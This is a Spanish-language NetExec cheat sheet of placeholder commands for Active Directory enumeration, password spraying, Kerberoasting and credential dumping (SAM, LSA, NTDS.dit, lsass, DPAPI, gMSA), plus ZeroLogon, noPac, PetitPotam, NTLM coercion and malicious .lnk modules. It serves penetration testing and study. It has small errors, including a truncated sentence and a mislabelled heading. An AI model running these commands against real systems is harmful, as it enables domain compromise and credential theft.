// CHEATSHEET

NetExec

Referencia de comandos para enumeración y post-explotación con NetExec.

Docs & Fuentes netexec.wiki — Documentación oficial github.com/Pennyw0rth/NetExec

Uso Básico

nxc <service> <target> -u <username> -p <password>
nxc <service> <target> -u <username> -H <NT_HASH>

Sintaxis base para distintos servicios (smb, ldap, mssql, ftp, ssh, winrm, etc). El flag -H permite Pass-the-Hash (PtH).

Autenticación

nxc smb <target> -u '' -p ''

Null authentication — sin credenciales.

nxc smb <target> -u 'guest' -p ''

Guest authentication — usuario por defecto en Windows.

nxc smb <target> -u <username> -p <password> --local-auth

Local authentication — fuerza autenticación contra cuentas locales (SAM) en lugar de cuentas de AD.

nxc smb <target> -u <username> -p <password> -k
nxc ldap <target> --use-kcache

Kerberos authentication — usa ticket activo en caché (-k) o KRB5CCNAME (--use-kcache).

nxc smb <targets> --gen-relay-list relay.txt

SMB Signing — genera lista de hosts sin signing habilitado, candidatos para relay attacks.

Enumeración General

nxc smb <target>

Enumeración básica: OS, hostname, dominio, versión SMB y signing.

nxc smb <target> -u '' -p '' --shares
nxc smb <target> -u <username> -p <password> --shares

Listar shares disponibles.

nxc smb <target> -u '' -p '' --users
nxc smb <target> -u <username> -p <password> --users
nxc smb <target> -u '' -p '' --rid-brute

Listar usuarios. --rid-brute enumera por RID sin credenciales.

nxc smb <target> -u users.txt -p <password> --continue-on-success
nxc smb <target> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

Password spraying — --no-bruteforce evita probar automaticamente multiples contraseñas de una lista si la primera autenticacion .

Por Servicio

SMB

nxc smb <target> -u <username> -p <password> --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol

All-in-one LDAP: grupos, sesiones activas, usuarios, shares y política de contraseñas en un solo comando.

nxc smb <target> -u <username> -p <password> -k --get-file <target_file> <output_file> --share <sharename>

Descargar un archivo de un share específico.

nxc smb <target> -u <username> -p <password> -M spider_plus
nxc smb <target> -u <username> -p <password> -M spider_plus -o READ_ONLY=false

Módulo spider_plus — enumerar y descargar archivos legibles de los shares.

LDAP

nxc ldap <target> -u '' -p '' --users
nxc ldap <target> -u <username> -p <password> --users

Enumeración de usuarios.

nxc ldap <target> -u <username> -p <password> --trusted-for-delegation --password-not-required --admin-count --users --groups

All-in-one LDAP: delegación, cuentas sin password, Admin Count, usuarios y grupos.

nxc ldap <target> -u <username> -p <password> --kerberoasting hash.txt
nxc ldap <target> -u <username> -p <password> --asreproast hash.txt

Kerberoasting y ASREProasting

nxc ldap <target> -u <username> -p <password> --bloodhound --dns-server <ip> --dns-tcp -c all

Recopilar datos de AD en formato BloodHound.

nxc ldap <target> -u <username> -p <password> -M ldap-checker

Verificar estado de LDAP Signing y LDAPS Channel Binding para LDAP Relay.

nxc ldap <target> -u <username> -p <password> -M adcs

Enumeración de ADCS.

nxc ldap <target> -u <username> -p <password> -M maq

MachineAccountQuota — cantidad de cuentas de equipo que un usuario puede crear.

nxc ldap <target> -u <username> -p <password> -M pre2k

Identificar cuentas pre-Windows 2000 e intentar obtener ticket TGT utilizando su contraseña.

nxc ldap <target> -u <username> -p <password> --find-delegation

Encontrar objetos con Unconstrained, Constrained o RBCD.

MSSQL

nxc mssql <target> -u <username> -p <password>

Autenticación básica en MSSQL.

nxc mssql <target> -u <username> -p <password> -x <command>

Ejecutar comandos del sistema via xp_cmdshell.

Credential Dumping

LSA / SAM

LSA (HKLM\LSA) y SAM (HKLM\SAM) contienen usuarios locales con sus hashes. Requiere privilegios de administrador.

nxc smb <target> -u <username> -p <password> --lsa
nxc smb <target> -u <username> -p <password> --sam
nxc smb <target> -u <username> -p <password> --sam --lsa --dpapi

Identificar si el usuario cuenta con privilegios necesarios para el Dumpeo.

NTDS.dit

NTDS.dit es la base de datos del controlador de dominio — contiene todos los hashes del dominio. Requiere Domain Admin en un Domain Controller.

nxc smb <target> -u <username> -p <password> --ntds

Identificar si el usuario cuenta con privilegios necesarios para el Dumpeo.

DPAPI

nxc smb <target> -u <username> -p <password> --dpapi

Dumpear secretos protegidos por DPAPI: credenciales de navegadores, certificados, etc.

lsass

nxc smb <target> -u <username> -p <password> -M lsassy

Dump de lsass en memoria via módulo lsassy — obtiene credenciales en texto claro(solo si WDigest esta activo).

gMSA

netexec ldap <target> -u <username> -p <password> --gmsa

Recuperar contraseñas de cuentas gMSA.

Vulnerabilidades

nxc smb <target> -u <username> -p <password> -M zerologon

ZeroLogon (CVE-2020-1472) — permite cambiar la contraseña del Domain Controller sin autenticación.

nxc smb <target> -u <username> -p <password> -M petitpotam

PetitPotam — fuerza autenticación NTLM del DC hacia un listener controlado.

nxc smb <target> -u <username> -p <password> -M nopac

noPac (CVE-2021-42278/42287) — escala de usuario de dominio a Domain Admin.

Módulos Útiles

nxc smb <target> -u <username> -p <password> -M webdav

webdav — detecta si WebDAV está activo para relay via HTTP.

nxc smb <target> -u <username> -p <password> -M veeam

veeam — extrae credenciales almacenadas en servidores de backup Veeam.

nxc smb <target> -u <username> -p <password> -M slinky

slinky — crea archivos .lnk maliciosos en shares para capturar hashes NTLM.

nxc smb <target> -u <username> -p <password> -M coerce_plus -o LISTENER=<ip-controlled>

coerce_plus — fuerza autenticación NTLM del objetivo hacia el listener (múltiples métodos de coerción).

nxc smb <target> -u <username> -p <password> -M enum_av

enum_av — detecta antivirus y EDR instalados en el objetivo.
